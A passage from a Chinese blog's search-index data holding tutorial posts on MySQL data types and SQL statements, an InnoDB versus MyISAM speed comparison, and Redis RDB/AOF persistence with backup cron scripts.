插入超过位数长度的时候不会影响真正存储，只是长度定义就没有意义。 无符号类型使用 unsigned 自动生成序号 auto_increment 小数表示可以有浮点数和定点数。浮点数：float，double，定点数：decimal。 小数都可追加”(M, D)“表示，M表示一共显示M位数字， D位位于小数点后面， M和D又称为精度和标度。 bit类型用于存放位字段，可以指定长度1-64， 如果不指定则为1，select无法查询到结果， 可以用bin()显示二进制格式，或者hex()显示十六进制格式。 日期类型 年 月 入用date表示 年 月 日 时 分 秒 用datetime表示 时 分 秒 用time表示 日期和时间类型 字节 最小值 最大值 date 4 1000-01-01 9999-12-31 datetime 8 1000-01-01 00:00:00 9999-12-31 23:59:59 timestamp 4 19700101080001 2038年某刻 time 3 -838:59:59 838:59:59 year 1 1901 2155 Timestamp存放时会先转换为本地时区后存放，取出时同样需要将时间日期转换成本地时区后显示。这样两个时区的用户看到的同一个日期可能是不一样的 12345# 查看当前时区show variables like 'time_zone';# 修改时区set time_zone='+9:00'; 字符串类型 字符串类型 字节 描述及存储需求 char(m) m m为0~255之间的整数 varchar(m) m为0~65535之间的整数，值的长度+1个字节 tinyblob 允许长度0~255字节，值的长度+1个字节 blob 允许长度0~65535字节，值的长度+2字节 mediumblob 允许长度0～~167772150字节。值的长度+3个字节 longblob 允许长度0~4294967295字节，值的长度+4个字节 tinytext 允许长度0~255字节，值的长度+2个字节 text 允许长度0~65535字节，值的长度+2字节 mediumtext 允许长度0～~167772150字节。值的长度+3个字节 longtext 允许长度0~4294967295字节，值的长度+4个字节 varbinary(M) 允许长度0～M个字节的变长字节字符串，值的长度+1个字节 binary(M) M 允许长度0～M个字节的定长字符串 varchar、char：char删除内容尾空格，varchar保留尾部空格 枚举类型：对于1~255个成员的枚举需要一个字节，对于255~65535个成员需要2个字节存储。最多允许65535个成员。 12345# 创建枚举类型create table t(gender enum('m', 'f'));# 插入测试记录insert into t values('m'), ('1'), ('f'), (null); set类型：set里面可以包含0~64个成员。根据成员的不同，存储也不同 1~8， 1字节 9~16， 2字节 17~24， 3字节 25~32， 4字节 33~64， 8字节 enum类型只可以选择一个对象，set可以选取多个成员 12345# 创建表create table t(col set('a', 'b', 'c', 'd'));# 插入内容insert into t values('a, b'), ('a, d, a'), ('a, b'), ('a, c'), ('a');","path":"2019/09/13/MySQL-数据类型/","date":"09-13","excerpt":"数值类型 整数类型 字节 最小值(有符号/无符号) 最大值(有符号/无符号) tinyint 1 -1280 127255 smallint 2 327680 3276765535 mediumint 3 -83886080 838860816777215 int, integer 4 -21474836480 21474836474294967295 bigint 8 -92233720368547758080 922337203685477580718446744073709551615","tags":[]},{"title":"MySQL-SQL基础","text":"SQL分类 DDL(Date Definition Languages)： 数据定义语句，这些语句定义了不同的数据段、数据库、表、列、索性等数据库对象，常用的语句关键字主要包括create、drop、alter DML(Date Manipulation Language)：数据操纵语句, 用于添加、删除、更新和查询数据库记录，并检查数据完整新。常用关键字包括 insert、delete、 update、select。 DCL(Date Control Language): 数据控制语句， 用于控制不同数据段直接的许可和访问级别的语句，这些语句定义了数据库、表、字段、用户的访问权限和安全级别。主要关键字包括grant、 revoke等。 DDL语句常用DDL语句的使用方法 创建数据库1create datebase test1; 删除数据库1drop database test1; 创建表1234567891011# 创建语句create table emp( ename varchar(10), hiredate date, sal decimal(10, 2), deptno int(2));# 查看定义desc [tablename]# 查看创建语句show create table [tablename] \\G; 删除表1drop table [tablename] 修改表修改表类型12345# 修改语法， column可以省略， first | after也可以省略alter table [tablename] modify `column` [column_name] &#123; first | after col_name&#125;;# 示例alter table emp modify ename varchar(20); 增加表字段12345# 增加字段语法alter table [tablename] add `column` [column_definition] &#123; first | after col_name &#125;;# 示例alter table emp add column age int(3); 删除表字段12345# 删除字段语法alter table [tablename] drop `column` col_name;# 示例alter table emp drop column age; 字段改名12345# 字段改名语法alter table [tablename] change [column] old_col_name column_definition &#123; first | after col_name &#125;;# 示例alter table emp change age age1 int(4); change 和 modify都可以修改表的定义， 不同的是change后面需要写两次列名， 不方便， 但是change的优点是可以修改列名称，modify则不能 修改字段排序字段增加和修改语法中都有一个可选项{first | after col_name}, 这个选项可以用来修改字段在表中的位置， add增加的新字段默认是加载表最后，change、modify默认都会不改变字段的位置。 12345# 将新增的字段birth date 加在ename之后alter table emp add birth date after ename;# 修改age字段， 将他放在最前面alter table emp modify age int(3) first; change/ first | after column 属于mysql 在标准sql上扩展， 其他数据库不一定适用 更改表名12345# 修改表名语法alter table [tablename] rename `to` new_tablename;# 示例alter table emp rename emp1; DML语句主要包括inset, update, delete, select 插入记录12345678910111213# 插入记录语法insert into [tablename](field1, field2 ... fieldn) values(value1, value2 ... valuen);# 多条记录插入语法insert into [tablename](field1, field2 ... fieldn) values (value1, value2 ... valuen),(value1, value2 ... valuen),(value1, value2 ... valuen)...(value1, value2 ... valuen);# 示例insert into emp(ename, hiredate, sal, deptno) values(&apos;zzx1&apos;, &apos;2019-08-08&apos;, &apos;2000&apos;, 1); 插入语句可以不用指定字段名称，但是values后面的顺序应该和字段的排列顺序一致 含可空字段，非空但是含有默认值的字段、自增字段，可以不用在insert后的字段列表里出现，，没写的字段可以自动设置NULL。 更新记录12345678# 更新记录语法update [tablename] set field1=value1, field2=value2,...fieldn=valuen [where condition];# 更新多表数据update t1,t2,...tn set t1,field1=expr1, ... tn.fieldn=exprn [where condition];# 示例update emp a, dept b set a.sal=a.sal*b.deptno, b.deptname=a.ename where a.deptno=b.deptno; 删除记录1234567891011# 删除语法delete from [tablename] [where condition]# 示例delete from emp where ename=&apos;dony&apos;;# 删除多个数据表数据delete t1, t2, ... tn from t1, t2, ... tn [where condition];# 示例delete a, b from emp a,dept b where a.deptno=b.deptno and a.deptno = 3; 不加where会删除整表 查询记录1234567891011121314151617181920212223242526272829303132333435363738# 基本查询语法select * from [tablename] [where condition];# 示例select * from emp;# 查询不重复记录语法select distinct field from [tablename];# 查询值排序, 如果排序字段的值一样， 则值相同的字段按照第二个排序字段进行排序，以此类推select * from [tablename] [where condition] [order by field1 desc | asc ], [order by field1 desc | asc ], ... [order by field1 desc | asc ];# limit截取部分内容select ... [limit offset_start, row_count];# 聚合语法select [field1, field2, ... fieldn] fun_name from tablename [where where_condition] [group by field1, field2, ... fieldn] [with rollup] [having where_condition];* fun_name 聚合函数（sum， count， max， min）* group by 需要聚合的字段* with rollup 可选， 表明是否分类后的结果进行再汇总* having 关键字表示对分类后的结果在进行条件过滤- having 和 where 的区别在于， having是对聚合后的结果进行条件的过滤， 而where是在聚合前就对记录进行过滤， 如果逻辑允许， 尽可能用where先过滤记录， 这样因为结果集减小， 将对聚合的效率大大提高，最后根据逻辑看是否用having进行过滤# 示例select deotno, count(1) from emp group by deptno having count(1) &gt; 1;# 表连接 表连接分两种，外链接和内连接，内连接仅选出两张表中互相匹配的记录，外链接选出其他不匹配的记录select ename, deptname from emp, dept where emp.deptno = dept.deptno;* 左连接： 包含所有的左边表中的记录甚至是右边表中没有和他匹配的记录* 右连接：包含所有的右边表中的记录甚至是左边表中没有和他匹配的记录# 子查询select * from emp where deptno in(select deptno from dept);# 记录联合* union all 把结果集直接合并在一起* union 将union all 后的结果进行一次distinct，去除重复记录后的结果select deptno from emp union all selet deptno from dept; DCL语句DBA系统中的对象权限时使用 12345# 创建zl具有对sakila数据库中所有表的select、insert权限grant select, insert on sakila.* to &apos;z1&apos;@&apos;localhost&apos; identified by &apos;123&apos;;# 去除插入权限revoke insert on sakila.* from &apos;z1&apos;@&apos;localhost&apos;; #","path":"2019/09/13/MySQL-SQL基础/","date":"09-13","excerpt":"SQL分类 DDL(Date Definition Languages)： 数据定义语句，这些语句定义了不同的数据段、数据库、表、列、索性等数据库对象，常用的语句关键字主要包括create、drop、alter DML(Date Manipulation Language)：数据操纵语句, 用于添加、删除、更新和查询数据库记录，并检查数据完整新。常用关键字包括 insert、delete、 update、select。 DCL(Date Control Language): 数据控制语句， 用于控制不同数据段直接的许可和访问级别的语句，这些语句定义了数据库、表、字段、用户的访问权限和安全级别。主要关键字包括grant、 revoke等。","tags":[]},{"title":"mysql的InnoDB与MyISAM速率对比","text":"转自：Steve BennettMyISAM与InnoDB速度对比我们首先创建一个设置为InnoDB存储引擎的表demo_dynamic，如下所示：除主键索引外，我们不会在表上添加任何索引。这将允许我们查看每个引擎的原始速度。 我们在表中填充了5,000,000行。 我选择了一个demo_name值来搜索行集中间的值。请注意，我们已使用随机密钥生成函数而不是实际名称的结果填充了demo_name列。我们还在查询中指定了SQL_NO_CACHE选项，以确保MySQL不会提取缓存结果。我们的搜索耗时高达4.32秒。不太好，但请记住，搜索列上没有索引。 现在让我们将引擎更改为MyISAM并再次运行我们的SELECT。 好。可以说选择MyISAM的速度更快。但是，使用MyISAM表的一个缺点是MyISAM实现了表级锁定。这意味着运行查询所花费的时间是1.58秒，任何其他查询都被放入队列中，以便在我们发布锁定后进行处理。四个查询同时尝试访问我们的demo_dynamic表的点，使用InnoDB的行级锁定会更有效。假设这四个查询没有尝试访问同一行。 固定表与动态表对比幸运的是，通过使用固定（或静态）行格式，MyISAM表可以更快地选择记录。当表包含任何可变长度的列时，MyISAM默认使用动态行格式。（例如VARCHAR，TEXT，BLOB）。 您可以通过查看INFORMATION_SCHEMA.TABLES表来检查表的当前行格式。 为了测试，我们将从我们的demo_dynamic表创建一个新的表demo_fixed，并将行格式设置为fixed。 与Dynamic相比，固定行格式的速度提高了44％。固定行格式的缺点是存储列所需的空间。更改为固定行格式将填充任何带有空格的可变长度列。但是，只要您的性能权衡以磁盘空间为代价，性能就会获胜。","path":"2019/09/10/mysql的InnoDB与MyISAM速率对比/","date":"09-10","excerpt":"转自：Steve BennettMyISAM与InnoDB速度对比我们首先创建一个设置为InnoDB存储引擎的表demo_dynamic，如下所示：除主键索引外，我们不会在表上添加任何索引。这将允许我们查看每个引擎的原始速度。","tags":[]},{"title":"redis持久化RDB和AOF","text":"redis的持久化rdb和aof的方式各自怎么配置开启RDB12345678910111213141516save 900 1save 300 10save 60 10000dbfilename xxxx# 分别表示每900秒进行了1次修改操作则进行RDB快照保存每300秒进行了10次修改操作则进行RDB快照保存每60秒进行了10000次修改操作则进行RDB快照保存保存的名称为xxxx# RDB没有载入命令， 服务器启动时检测到有RDB文件就会自动载入# 载入时日志输出 DB loaded from disk：.... AOF123456789appendonly yesappendfilename xxxx# 第一个参数表示开启AOF# 第二个参数表示AOF文件的名称# AOF保存的路径和dir配置的一致。# 因为AOF文件更新频率通常比RDB文件的更新频率高，所以如果服务器开启了AOF持久化功能，那么服务器就会优先使用AOF文件来还原数据库数据# 只有在AOF持久化功能关闭状态时，服务器才会使用RDB文件来还原数据库状态 各自的特点是什么，持久化的过程RDB持久化流程graph TB A(bgsave) -->|1| B(父进程) B-->C(有其他子进程正在执行,直接返回) style C fill:#cec,stroke:#f66,stroke-width:2px,stroke-dasharray: 5, 5; B-->H(BGREWRITEAOF正在执行,拒绝此次BGSVE) style H fill:#dec,stroke:#f66,stroke-width:2px,stroke-dasharray: 5, 5; B-->|2| D(fork) D--> E(子进程) D -->|3| F((响应其他命令)) E -->|4| G(生成RDB文件) E-->|5信号通知父进程| B I(发送BGREWRITEAOF命令)-->|冲突命令|F F-->|冲突解决|J(BGSAVE命令结束后再继续执行BGREWRITEAOF) 如果已经存在RDB/AOF子进程则直接返回 fork过程父进程会阻塞，通过info stats命令查看latest_fork_usec可以看到最近一次fork耗时多少微秒 fork完成后会返回Background saving started信息，并不在阻塞 创建RDB文件，根据父进程内存生成临时快照文件，完成后对原有文件进行原子替换。执行lastsave命令可以得到上次生成RDB的时间，对应Info Persistence命令中的rdb_last_save_time参数 进程发送信号给父进程表示完成， 父进程更新info Persistence 关于rdb_*的统计信息 文件的处理RDB文件保存在dir配置指定的目录下，文件名和dbfilename配置相同，可以通过config set dir{newDir} / config set dbfilename {newFileName}在运行期间动态更新配置。 RDB文件默认使用LZF算法进行压缩，压缩后的文件大小远远小于内存中的大小，可以通过修改rdbcompression参数修改，或者执行命令config set rdbcompression {yes|no}动态修改 优缺点优点： 是一个紧凑压缩的二进制文件，代表Redis在某个时间点上的数据快照，适用于备份， 全量复制等场景 加载RDB恢复的速度远远快于AOF 缺点： 没有办法做到实时持久化\\秒级持久化。因为bgsave每次运行都要fork子进程，频繁操作成本过高 RDB文件使用二进制格式保存，Redis版本演进过程中有多个redis格式版本，存在新老版本不兼容问题 RDB文件结构123456789|REDIS|db_version|databases|EOF|check_sum|REDIS:长度为5字节的‘REDIS’五个字符，用于快速检查所有载入的文件是否RDB文件db_version:长度为4字节，他的值是一个字符串表示的整数，这个是整数记录了RDB文件的版本号，比如0006，就代表RDB文件的版本为第六版databases：包含着0个或者任意多个数据库，以及各个数据库中的键值对数据 如果服务器数据库状态为空，那么这个部分也为空，长度为0字节 如果服务器有至少一个数据库非空，那么这个部分也非空，根据数据库所保存键值对的数量，类型和内容不同， 这个部分的长度也有所不同EOF：常量的长度为1字节，这个常量标志者RDB文件正文内容的借书，当读入程序遇到这个值的时候他知道所有数据库的所有键值对都已经载入完毕了check_sum:是一个8字节长的无符号整数，保存着一个校验和，这个校验和是程序通过对REDIS，db_version, databases,EOF四个部分的内容进行计算得出的。服务器在载入RDB文件时，会将再如数据所计算出的校验与check_sum所记录的校验和进行对比，以此来检测是否有出错或者损坏情况 databases部分如果一个数据库0/3非空，那么服务器将创建一个以下结构的RDB文件 1|REDIS|db_version|database 0|database 3|EOF|check_sum| 每个databases部分都是以下三个部分 123456789|SELECTDB | db_number | key_value_pairs|SELECTDB: 常亮长度为1字节，当读入程序遇到这个值的时候知道接下来要读入的将是一个数据库号码db_number: 保存者一个数据库号码，根据号码的大小不同，这个部分的长度可以是1字节，2字节，5字节。当程序读入db_number部分之后，服务器会调用select命令根据读入的数据库号码进行数据库切换，使得之后读入的键值对可以载入到正确的数据库中key_value_pairs: 部分保存了数据库中所有键值对数据，如果键值对带有过期时间，那么过期时间也会和键值对保存在一起，根据键值对的数量、类型、内容、以及是否过期等条件不同，key_value_pairs部分的长度也会有所不同所以上面这个例子的结构又可以是|REDIS|db_version|SELECTDB | 0 | key_value_pairs|SELECTDB | 3 | key_value_pairs|EOF|check_sum| key_value_pairs部分key_value_pairs结构 1234567891011121314151617181920212223不带过期时间的键值对|TYPE|KEY|VALUE|TYPE： REDIS_RDB_TYPE_STRING REDIS_RDB_TYPE_LIST REDIS_RDB_TYPE_SET REDIS_RDB_TYPE_ZSET REDIS_RDB_TYPE_HASH REDIS_RDB_TYPE_LIST_ZIPLIST REDIS_RDB_TYPE_SET_INTSET REDIS_RDB_TYPE_ZSET_ZIPLIST REDIS_RDB_TYPE_HASH_ZIPLISTKEY: 是一个字符串对象，编码方式和REDIS_RDB_TYPE_STRING类型的value一样，根据内容长度不同， key长度也有所不同VALUE：根据保存的结构不同， 保存的形式和长度都会有所不同带有过期时间的键值对|EXPIRETIME_MS|ms|TYPE|KEY|VALUE|EXPIRETIME_MS: 常量长度，告知读入程序接下来读入的将是一个以毫秒为单位的过期时间ms:是一个8字节的带符号整数，记录一个以毫秒为单位的unix时间戳，这个时间戳是这个键的过期时间 value编码每个value部分都保存了一个值对象, 根据TYPE不同，value部分的结构长度也不同 REDIS_ENCODING_*编码 字符串对象 如果TYPE的值为REDIS_RDB_TYPE_STRING, 那么value保存的就是一个字符串对象，字符串对象的编码可以是REDIS_ENCODING_INT, REDIS_ENCODING_RAW。 如果字符串对象的编码为REDIS_ENCODING_INT，那么说明对象中保存的是长度不超过32位的整数，这种编码的对象以以下格式保存 1234|ENCODING|content|# 例如 用8位保存的整数123| REDIS_RDB_ENC_INT8 | 123 | 如果字符串编码为REDIS_ENCODING_RAW，那么说明保存的是一个字符串，根据长度不同，有压缩和不压缩两种方式保存（手动关闭压缩选项情况除外） 如果字符串的长度小于20字节，那么这个字符串将原样保存 如果这个字符串长度大于20字节， 那么这个字符串会被压缩保存 如果没有被压缩将以下格式保存 1234| len | string |# 例如 ”hello“| 5 | hello | 如果压缩后将按照以下格式保存 123456789| REDIS_RDB_ENC_LZF | compressed_len | orgin_len | compressed_string |REDIS_RDB_ENC_LZF:标志字符串已经被LZF算法压缩过了compressed_len：被压缩之后长度orgin_len：原来的长度compressed_string： 被压缩后的字符串内容# 例如| REDIS_RDB_ENC_LZF | 6 | 21 | ?aa??? | 列表对象 如果TYPE的值是REDIS_RDB_TYPE_LIST，那么value保存的就是一个REDIS_ENCODING_LINKEDLIST编码的列表对象，RDB文件保存这种对象的结构 1234567| list_length | item1 | item2 | ... | itemn|# list_length记录了列表的长度， 记录列表item的个数# 因为item项都是字符串对象，所以程序会以处理字符串对象的方式来保存读入列表项# 示例 一个list中有三个项 hello world ！|3|5|hello|5|world|1|!| 集合对象 当TYPE为REDIS_RDB_TYPE_SET，那么value保存的就是一个REDIS_ENCODING_HT编码的集合对象，RDB文件保存这种对象结构图 1234567| set_size | elem1 | elem2 | ... | elemN |set_size:表示集合的大小，记录了有多少个elem对象elem：表示集合元素，因为每个集合元素都是一个字符串对象，所以程序会以处理字符串对象的方式来保存和读入集合元素# 示例 集合中有四个对象 apple banana cat dog| 4 | 5 | apple | 6 | banana | 3 | cat | 3 | dog | 哈希表对象 当TYPE为REDIS_RDB_TYPE_HASH, 那么value保存的就是一个REDIS_ENCODING_HT, 结构如下 123456789| hash_size | key_value_pair 1 | key_value_pair 2 | ... | key_value_pair n |hash_size: 记录了哈希表的大小key_value_pair： 开头部分代表哈希表中的键值对，键值对都是字符串对象，所以程序会已处理字符串对象的方式来保存和读入键值对key_value_pair：存储格式 |key1|value1|key2|value2|...|keyn|valuen|# 示例 两个键值对 a apple b banana| 2 | 1 | a | 5 | apple | 1 | b | 6 | bannana | 有序集合对象 当TYPE为REDIS_RDB_TYPE_ZSET，那么value保存的就是一个REDIS_ENCODING_SKIPLIST编码的有序集合对象， 结构如下 12345678910| sorted_set_size | element1 | element2 | ... | elementN | sorted_set_size:记录有序集合数量element： 分成两个部分， 一个为score， 另一个member， memeber是一个字符串对象，score是一个double类型的浮点数，但是程序会在转换的时候将double转换成字符串对象， 然后再用保存字符串对象的方法将score和member保存起来| sorted_set_size | member1 | score1 | member2 | score2 | ... | memberN | scoreN | # 示例 有序集合含有两个对象 pi 3.14 e 2.7| 2 | 2 | pi | 4 | 3.14 | 1 | e | 3 | 2.7 | INTSET编码集合 如果TYPE的值为REDIS_RDB_TYPE_SET_INTSET, 那么value保存的就是一个整数集合对象.RDB文件保存这种对象的方法是,先将整数集合转换为宇符串对象，然后将这个字符串对象保存到RDB文件里面。如果程序在读入RDB文件的过程中，碰到由整数集合对象转换成的宇符串对象，那么程序会根据TYPE值的指示.先读人字符串对象，再将这个宇符串对象转换成原来的整数集合对象。 ZIPLIST编码的列表、哈希表或者有序集合如果 TYPE 的值为 REDIS_RDB_TYPE_LIST_ZIPLIST、 REDIS_RDB_TYPE_HASH _ZIPLIST 或者 REDIS_RDB_TYPE_SET_ZIPLIST,那么 value 保存的就是一个压縮列表对象，RDB文件保存这种对象的方法是： 将压缩列表转换成一个宇符串对象。 将转换所得的字符串对象保存到RDB文件。 如果程序在读人RDB文件的过程中，碰到由任缩列表对象转换成的宇符串对象，那么程序会根据TYPE值的指示，执行以下操作： 读入字符串对象，并将它转换成原来的压缩列表对象 根据TYPE的值，设置压缩列表对象的类型：如果TYPE的值为REDIS_RDB_ TXPE_LIST_ZIPLIST,那么压缩列表对象的类型为列表 ；如果TYPE的值为REDIS _ RDB_TYPE_HASH_ZIPLIST,那么压缩列表对象的类型为哈希表；如果TYPE的值为 REDIS_RDB_TYPE_ZSET_ZIPLIST,那么压缩列表对象的类型为有序集合。 从步骤2可以看出，由于TYPE的存在，即使列表 、哈希表和有序集合三种类型都使用压缩列表来保存，RDB读入程序也总可以将读入并转换之后得出的压缩列表设置成原来的类型。 AOF持久化流程graph TB A(命令写入) -->|1.append| B(AOF缓冲) B-->|2.sync|C(AOF文件) C-->|3.rewrite|C D(重启)-->|4.load|C 所有的写入命令会追加到aof_buf（缓冲区) AOF缓冲区根据对应的策略向硬盘做同步操作 随着AOF文件越来越大，需要定期对AOF文件进行重写，达到压缩的目的 当redis服务器重启时，可以加载AOF文件进行数据恢复 AOF持久化可以分为追加， 文件写入，文件同步 追加当aof打开时，服务器执行完一次写命令后会以协议格式将被执行的写命令追加到服务器的aof_buf缓冲区的末尾 redis&gt; SET KEY VALUE 执行set命令后， 会将内容根据协议追加到aof_buf末尾 *3\\r\\n$3\\r\\nSET\\r\\n$3\\r\\n$5\\r\\nVALUE\\r\\n 写入与同步redis服务器进程就是一个事件循环，循环中的文件时间负责接收客户端的命令请求以及向客户端发送命令回复，在这些请求中可能会执行写命令，使得一些内容被追加到aof_buf缓冲区里面，所以在服务器每次结束一个事件循环前都会考虑根据appendfsync配置是否需要将aof_buf缓冲区的内容写入和保存到AOF文件里面 载入与还原 建立不带网络的伪客户端(reids命令只能在客户端执行，而AOF命令来自文件而不是网路) 从AOF文件中分析并读取出一条写命令 使用伪客户端执行被读出的写命令 重复2、3步骤，直到AOF文件中的所有写命令都被处理完毕 重写123456789101112# 执行rpush list \"a\" \"b\"rpush list \"c\"rpush list \"d\" \"e\"lpop listlpop listrpush list \"f\" \"g\"# 第一次保存后，list的信息保存了6条# 重写后可以压缩为rpush list \"c\" \"D\" \"E\" \"F\" \"G\"这样就可以用一条命令替代上面的6条命令 为了避免在执行命令时造成客户端缓冲区溢出，重写程序在处理列表、哈希表、集合、有序集合、这四种可能存在多个元素的键时，会先检查元素的个数，如果超过了REDIS_AOF_REWRITE_ITEMS_CMD（默认64）常量的值，那么会分多条命令写入 AOF后台重写 父进程创建子进程，并且由子进程进行AOF重写 子进程重写期间，父进程的写命令会发送给AOF缓冲区和AOF重写缓冲区 子进程重写完毕后会发送信号给父进程 父进程接收到信号后将AOF重写缓冲区中的所有内容写入到新AOF中 对新AOF文件进行改名，原子的覆盖现有的AOF文件，完成新旧两个AOF文件替换 整个流程中只有型号处理的时候父进程会造成阻塞。 rdb和aof持久化和写盘的触发机制设置， 手动触发持久化的方法RDB手动触发命令：save和bgsave save：阻塞当前Redis服务器，直到RDB过程完成位置，对于内存比较大的实例会造成长时间阻塞，线上环境不建议使用，save命令对应的Redis日志 DB saved on disk bgsave：Redis进程fork操作创建子进程，RDB持久化过程由子进程负责，完成后自动结束。阻塞只发生在fork阶段，一般时间很短。运行bgsave命令对应的Redis日志 Background saving started by pid xxxx DB saved on disk RDB: 0 MB of memory used by copy-on-write Background saving terminated with success 自动触发RDB机制 使用save相关配置save m n ,在m秒内数据集存在n次修改时，自动触发bgsave 从节点执行全量复制操作，主节点自动执行bgsave生成RDB 执行debug reload命令重新加载redis时会自动触发save操作 默认情况下执行shutdown命令时， 如果没有开启AOF持久化功能，则自动执行bgsave 设置保存条件在redisServer结构中saveparams属性保存了条件数组 123456struct redisServer&#123; // ... //保存条件数组 struct saveparam *saveparams; // ...&#125;; 每个saveparam结构保存了一个save选项设置的条件 1234567struct saveparam&#123; // 秒数 time_t seconds; // 修改量 int changes;&#125; 记录属性除此之外，还维护了一个dirty计数器，以及一个lastsave属性 dirty计数器记录距离上一次成功执行save命令或者bgsave命令之后服务器对数据库状态进行了多少次修改 lastsave属性是一个unix时间戳，记录了服务器上一次成功执行save命令或者bgsave命令时间 12345678910struct redisServer&#123; // ... // 修改计数器 每次成功执行一个数据库修改命令后程序就会对dirty计数器进行更新 long long dirty; time_t lastsave; // ...&#125;; 检查条件是否满足redis的服务器周期性操作函数serverCron默认每隔100毫秒就会执行一次，该函数用于对正在运行的服务器进行维护，他的其中一项工作就是检查save选项所设置的保存条件是否已经满足，如果满足就会执行bgsave命令 AOF文件同步AOF缓冲区同步文件策略由参数appendfsync控制 参数 说明 always 命令写入aof_buf后调用系统fsync操作同步到AOF文件，fsync完成后线程返回，一旦配置这个，redis只能支持几百TPS，与redis高性能背道而驰，不建议配置 everysec 命令写入aof_buf后调用系统write操作，write完成后线程返回。fsync同步文件操作由专门线程每秒调用一次，默认配置，做到兼顾性能和数据安全性，理论上只有在系统突然宕机的情况下丢失1秒数据 no 命令写入aof_buf后调用系统write操作，不对AOF文件做fsync同步， 同步硬盘操作由操作系统负责，通常同步周期最长30秒。由于操作系统每次同步AOF文件的周期不可控，每次同步硬盘的数据量会很大，虽然提升了性能，但是数据安全性无法保证 write：触发延迟写机制。Linux在内核提供页缓冲区来提高硬盘IO性能。write操作在写入系统缓冲区后直接返回。同步硬盘操作依赖于系统调度机制。文件同步之前如果系统故障宕机，缓冲区内数据丢失 fsync：正对单个文件操作（AOF文件），做强制硬盘同步，fsync将阻塞直到写入硬盘完成后返回，保证了数据持久化 重写机制 手动触发：BGREWRITEAOF 自动触发：根据auto-aof-rewrite-min-size和auto-aof-rewrite-percentage参数确定自动触发时机 触发时机=aof_current_size &gt; auto-aof-rewrite-min-size &amp;&amp; (aof_current_size - aof_base_size) / aof_base_size &gt;=auto-aof-rewrite-percentage auto-aof-rewrite-min-size：标识运行AOF重写时文件最小体积，默认64MB auto-aof-rewrite-percentage：代表当前AOF文件空间和上一次重写后AOF文件空间的比值 aof_current_size: 目前aof文件大小 aof_base_size: 上次的大小 graph TD 1(bgrewriteaof)-->|1|2(父进程) 2-->|2|3(fork) 3-->4(子进程) 4-->|4.1 新号通知父进程|2 3-->|2.1|5(aof_buf) 3-->|2.2|6(aof_rewrite_buf) 6-->|4.2|7(新AOF文件) 4-->|3|7 5-->8(旧AOF文件) 7-->|4.3|8 执行AOF重写请求，如果当前进程正在执行AOF重写，请求不执行并返回错误，如果正在执行bgsave，重写命令延迟到bgsave完成后再执行 父进程fork创建子进程，开销等同于bgsave过程 主进程fork操作完成后，继续响应其他命令。所有修改命令依然写入AOF缓冲区并根据appendfsync策略同步到硬盘，保证原有AOF机制正确性 由于fork操作运用写时复制技术，子进程只能共享fork操作时的内存数据。由于父进程依然响应命令，Redis使用AOF重写缓冲区保存这部分新数据，防止新AOF文件生成期间丢失这部分数据。 子进程根据内存快照，按照命令合并规则写入到新的AOF文件。每次批量写入硬盘数据量由配置aof-rewrite-incremental-fsync控制，默认为32MB，防止单次刷盘数据过多造成硬盘阻塞 新AOF文件写入完成后，子进程发送信号给父进程，父进程更新统计信息，具体见info persistence下的aof_*相关统计。 父进程把AOF重写缓冲区的数据写入到新的AOF文件。 使用新AOF文件替换老文件，完成AOF重写。 AOF载入流程 备份 开启RDB和AOF持久化方式 创建定时任务 1234# 创建定时任务crontab -e# 设置每个小时将RDB文件备份到另外一个文件夹0 1 * * * cp /your dump.rdb path ~/BACKUP/BACK_`date '+%Y%m%d_%H.%M.%S+'`.rdb 定期清除过期快照 12345678910111213141516171819202122232425# 添加定时任务crontab -e# 每个小时清除一次过期快照0 */1 * * * /bin/bash /your sh path/xxx.sh# xxx.sh 清除48小时之前的快照#!/bin/bash# 快照放置文件夹back_path=/path# 设置48小时前时间名称content=$(date +%Y%m%d_%H --date '2 day ago')cd $back_path# 统计删除的文件数量FileNum=$(find -name \"*$content*\".rdb | wc -l)echo \"--clean file:$(date +%Y%m%d_%H%M%S):$FileNum-----\"# 如果数量大于0，说明有文件需要删除if [ $FileNum -gt 0 ]; then echo \"delete [$content]\" # 通过通配符删除 rm -rf ./*$content*fi 一天一次将备份数据文件备份到redis服务器之外的机器上 1scp -r /path xxx@Ip:/path st=>start: 开始 op1=>operation: 服务器启动 op2=>operation: 执行在如程序 cond1=>condition: 已开启AOF持久化功能 op3=>operation: 载入AOF文件 op4=>operation: 载入RDB文件 st->op1->op2->cond1 cond1(yes)->op3 cond1(no)->op4{\"scale\":1,\"line-width\":2,\"line-length\":50,\"text-margin\":10,\"font-size\":12} var code = document.getElementById(\"flowchart-0-code\").value; var options = JSON.parse(decodeURIComponent(document.getElementById(\"flowchart-0-options\").value)); var diagram = flowchart.parse(code); diagram.drawSVG(\"flowchart-0\", options);op1=>operation: 创建新AOF cond1=>condition: 数据库全部遍历了？ cond2=>condition: 是否是空数据库 op2=>operation: 写入select命令，指定数据库号码 cond3=>condition: 已经遍历完所有的键？ cond4=>condition: 键已经过期？ op3=>operation: 根据键的类型对键进行重写，如果有过期时间，过期时间也要重写 op4=>operation: 写入完毕，关闭文件 op1->cond1 cond1(no)->cond2 cond2(no)->op2 op2->cond3 cond3(yes)->cond1 cond3(no)->op3 op3->cond3 cond2(yes)->cond1 cond1(yes)->op4{\"scale\":1,\"line-width\":2,\"line-length\":50,\"text-margin\":10,\"font-size\":12} var code = document.getElementById(\"flowchart-1-code\").value; var options = JSON.parse(decodeURIComponent(document.getElementById(\"flowchart-1-options\").value)); var diagram = flowchart.parse(code); diagram.drawSVG(\"flowchart-1\", options);op1=>operation: redis启动 op2=>operation: 加载RDB op3=>operation: 加载AOF op4=>operation: 启动成功 op5=>operation: 启动失败 cond1=>condition: 开启AOF？ cond2=>condition: 存在AOF？ cond3=>condition: 存在RDB？ cond4=>condition: 成功？ op1->cond1 cond1(no)->cond3 cond1(yes)->cond2 cond2(no)->cond3 cond2(yes)->op3 cond3(no)->op4 cond3(yes)->op2 op2->cond4 op3->cond4 cond4(yes)->op4 cond4(no)->op5{\"scale\":1,\"line-width\":2,\"line-length\":50,\"text-margin\":10,\"font-size\":12} var code = document.getElementById(\"flowchart-2-code\").value; var options = JSON.parse(decodeURIComponent(document.getElementById(\"flowchart-2-options\").value)); var diagram = flowchart.parse(code); diagram.drawSVG(\"flowchart-2\", options);","path":"2019/09/09/redis持久化RDB和AOF/","date":"09-09","excerpt":"redis的持久化rdb和aof的方式各自怎么配置开启RDB12345678910111213141516save 900 1save 300 10save 60 10000dbfilename xxxx# 